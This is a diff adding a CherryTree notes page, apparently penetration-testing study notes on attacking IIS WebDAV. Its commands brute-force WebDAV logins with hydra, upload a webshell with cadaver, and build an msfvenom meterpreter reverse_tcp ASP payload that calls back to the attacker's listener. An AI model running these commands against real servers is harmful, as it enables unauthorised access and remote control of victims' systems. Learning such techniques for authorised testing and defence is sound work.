@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="IIS - WebDav" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704144985" ts_lastsave="1704145540">
+    <rich_text>IIS (internet information services ) is proprietary microsoft web server. Functions the same as Apache or NGINx but the advantage is that administrators have a GUI to manage the sites hosted on IIS.
+
+Can host sites developed on aspx or PHP. Typically configured to run on ports 80 and 443
+
+.asp, .aspx, .config, .php
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">webdav</rich_text>
+    <rich_text>
+
+set of extension to HTTP protocol that allows users to manage files on web servers. Like a file server for collaborative authoring. Runs on otp of IIS.
+
+Credentials must be provided to authenticate (user name password identity). (sometimes not configured)
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">webdav exploitation</rich_text>
+    <rich_text>
+
+Involes determining if webdav has been configured to run (</rich_text>
+    <rich_text link="node 5">80/443 - HTTP</rich_text>
+    <rich_text> - enumeration) then we can brute force the webdav auth form to establish a foothold (by uploading a malicious .asp payload) 
+
+We will be working with tools that automate this. 
+
+- davtest (enumeration)
+- cadaver (exploitation)
+
+**nmap script**
+
+
+**hydra**
+
+
+**once credentialed run test with davtest**
+
+
+**Cadaver**
+
+
+This provides you with a webshell that you can interact with through the web browser.
+
+**Metasploit**
+
+can use msfvenom to generate the payload
+
+</rich_text>
+    <codebox char_offset="920" justification="left" frame_width="594" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p 80,443 --script=http-enum #discover interesting dirs like webdav</codebox>
+    <codebox char_offset="933" justification="left" frame_width="586" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -L usernamelist.txt -P passwordlist.txt ip.addr http-get /webdav/</codebox>
+    <codebox char_offset="980" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">davtest -auth username:password -url http://victim.com</codebox>
+    <codebox char_offset="995" justification="left" frame_width="537" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://ip.addr/webdav #you will need to enter creds
+#you will get a shell
+put /path/to/webshell #default kali location /usr/share/webshells</codebox>
+    <codebox char_offset="1142" justification="left" frame_width="970" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p windows/meterpreter/reverse_tcp LHOST=local.addr LPORT=1337 -f asp &gt; shell.asp #use 32bit shells for webdav
+use multi/handler #configure</codebox>
+  </node>
+</cherrytree>
